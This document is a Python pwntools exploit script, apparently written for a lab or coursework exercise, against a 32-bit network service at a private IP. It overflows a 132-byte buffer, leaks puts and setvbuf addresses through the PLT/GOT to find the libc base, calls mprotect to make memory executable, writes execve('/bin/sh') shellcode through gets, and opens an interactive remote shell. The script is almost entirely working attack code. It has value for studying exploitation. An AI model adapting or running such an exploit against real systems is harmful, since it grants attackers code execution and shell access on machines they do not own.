from pwn import *
import os
context.log_level = 'info'
# Setting up the remote connection by providing IP and port
# This will connect to the server running on netcat
r = remote('192.168.56.101', 9000)

# Padding with the offset required to overflow the buffer
offset = b'A'*132

# Address for start of the main function
main = b'\x08\x04\x84\x7b'[::-1]

# Addresses of puts in the PLT, puts in the GOT and setvbuf in the GOT
# These are static as the program is not compiled with PIE
plt_puts_addr = b'\x08\x04\x83\x40'[::-1] #p32(0x8048340)
got_puts_addr = b'\x08\x04\x97\xac'[::-1] #p32(0x80497ac)
got_setvbuf_addr = b'\x08\x04\x97\xb4'[::-1] #p32(0x80497b4)


''' 
Appending to the payload- the address of PUTs in the PLT
The argument for this is placed after the start of the main address,
the arg will be the GOT table address for puts.
This is because we call the puts function through the PLT
to output the address stored in the GOT.
Then it will return to the PLT puts and then output the setvbuf addr.
This however, will also output __libc_start_main- this is described in the report.
This will then return to the main function, enabling us to loop around and provide
another input.
'''
# Adding offset to the payload
payload = offset
payload += plt_puts_addr + main + got_puts_addr + got_setvbuf_addr

# Recv input before sending the payload
r.recv()
# send the remote process the payload to leak the libc addresses
r.sendline(payload)


# receive the output from the remote process and split by newline
# splitting enables us to extract just the addresses that we want
# the addresses are stored in output[6]

# receive a line before recieving the memory addresses
r.recv()

# Splitting program output to extract the addresses (at output[3])
output = r.recv().split(b"\n")

# 4 bytes for 32 bit- 8 for 64 bit
address_size = 4

# There are 3 addresses, therefore the output[3] is split into 3 4 byte addresses
addresses = [output[3][i:i+address_size] for i in range(0, len(output[3]), address_size)]
print(addresses)
# Which address[index] is which address? 
# address[0] = puts() address
# address[1] =__libc_start_main address
# address[2] = setvbuf() in libc address

# Turning the puts() address to integer to calculate the base of libc
address_int = int.from_bytes(addresses[0], byteorder='little')

# Calculating the base of libc by subtracting the puts() offset (from libc database)
# from the puts() address that was leaked
base = address_int - 0x5fcb0
base_address_bytes = base.to_bytes(len(addresses[0]), byteorder='little')

# Calculating the location of gets() by adding the known offset to the base of libc
gets_addr = base + 0x5f3f0
gets_address_bytes = gets_addr.to_bytes(len(addresses[0]), byteorder='little')

# Calculating the location of mprotect() by adding the known offset to the base of libc
mprotect_addr = base + 0xe2ec0
mprotect_addr_bytes = mprotect_addr.to_bytes(len(addresses[0]), byteorder='little')

# length of memory section to change permission
length_memory = p32(0x1b0000)

# code for RWX permissions
permissions = p32(0x00000007)

# Small nopsled + shellcode for execve("/bin/sh", 0, 0);
shellcode = b'\x90' * 20 + b"\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

# Offset to fill buffer-
# mprotect() address in libc followed by the return address (main)
# mprotect() args - memory location, length of memory and permissions to change
mprotect_payload = offset + mprotect_addr_bytes + main + base_address_bytes + length_memory + permissions

# Offset to fill buffer
# calling gets() to write shellcode to x position in memory
# Passing the return address for gets() as the base of libc so after the gets() call
# it will return to the base of libc and hit our nopsled then run the shellcode
# Argument for gets() is the location, provide base address of libc
gets_payload = offset + gets_address_bytes + base_address_bytes + base_address_bytes 


# Send the payload to change the libc section in memory to rwx
r.sendline(mprotect_payload)

# Send the payload to call gets
r.sendline(gets_payload)

# Pass the shellcode to gets to write to the location in libc
r.sendline(shellcode)

# Switching to the interactive mode to interact with the remote shell.
r.interactive()

# Writes the addresses leaked by the program to a file "addrs" for inspection
# Used to find the version of libc->
with open('addrs', 'wb') as f:
    test = b"A"*132 # write the padding so I can view in GDB
    f.write(test+addresses[0]+addresses[1]+addresses[2])

# Writing the exploit payload into a file for local analysis by running in GDB
# Helps resolve any problems leaking addresses
with open('exploit', 'wb') as f:
    test = b"A"*132
    f.write(payload)
